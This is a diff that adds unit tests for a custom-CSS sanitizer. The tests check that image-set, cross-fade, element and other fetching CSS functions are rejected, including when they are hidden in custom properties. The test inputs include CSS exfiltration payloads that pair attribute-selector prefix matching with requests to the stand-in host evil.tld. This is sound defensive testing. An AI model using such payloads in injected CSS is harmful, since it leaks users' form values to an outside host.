@@ -243,6 +243,65 @@ describe('sanitizeCustomCss', () => {
     expect(result).not.toContain('cursor');
   });
 
+  it('blocks every CSS image function, not just url()', () => {
+    // image-set() takes a bare string URL, so denylisting `url(` left it wide
+    // open; combined with attribute-selector prefix matching that is a
+    // character-at-a-time exfiltration channel out of every connected server.
+    const imageSet = sanitizeCustomCss(
+      'input[value^="a"] { background: image-set("https://evil.tld/a" 1x); }',
+    );
+    expect(imageSet).not.toContain('image-set');
+    expect(imageSet).not.toContain('evil.tld');
+
+    for (const value of [
+      '-webkit-image-set("https://evil.tld/a" 1x)',
+      '-moz-element(#leak)',
+      '-webkit-cross-fade(url(a), url(b), 50%)',
+      'cross-fade(url(a), 50%)',
+      'paint(evil)',
+      'linear-gradient(red, blue)',
+      'element(#leak)',
+      'src("https://evil.tld/a")',
+    ]) {
+      const result = sanitizeCustomCss(`.test { background: ${value}; }`);
+      expect(result, `expected "${value}" to be rejected`).toBe('');
+    }
+  });
+
+  it('keeps legitimate theme values working under the value allowlist', () => {
+    const css = `
+      .test {
+        color: #1a1a2e;
+        background-color: rgba(10, 20, 30, 0.5);
+        border: 1px solid var(--accent, #fff);
+        font-family: "Inter Variable", sans-serif;
+        padding: 0 .5rem;
+        box-shadow: 0 2px 4px rgb(0 0 0 / 25%);
+        transition: color 120ms ease-in-out;
+        margin-left: calc(100% - 12px);
+        text-transform: uppercase !important;
+      }
+    `;
+    const result = sanitizeCustomCss(css);
+    expect(result).toContain('color: #1a1a2e');
+    expect(result).toContain('background-color: rgba(10, 20, 30, 0.5)');
+    expect(result).toContain('border: 1px solid var(--accent, #fff)');
+    expect(result).toContain('font-family: "Inter Variable", sans-serif');
+    expect(result).toContain('padding: 0 .5rem');
+    expect(result).toContain('box-shadow: 0 2px 4px rgb(0 0 0 / 25%)');
+    expect(result).toContain('transition: color 120ms ease-in-out');
+    expect(result).toContain('margin-left: calc(100% - 12px)');
+    expect(result).toContain('text-transform: uppercase !important');
+  });
+
+  it('holds custom properties to the same value rules', () => {
+    // A custom property is substituted into a real property with var(), so it
+    // cannot be a hiding place for a fetching value.
+    expect(sanitizeCustomCss(':root { --x: image-set("https://evil.tld/a" 1x); }')).toBe('');
+    expect(sanitizeCustomCss(':root { --x: url(https://evil.tld/a); }')).toBe('');
+    expect(sanitizeCustomCss(':root { --x: red; }')).toContain('--x: red');
+  });
+
   it('strips nested at-rule blocks before evaluating declarations', () => {
     const css = `
       @media screen {
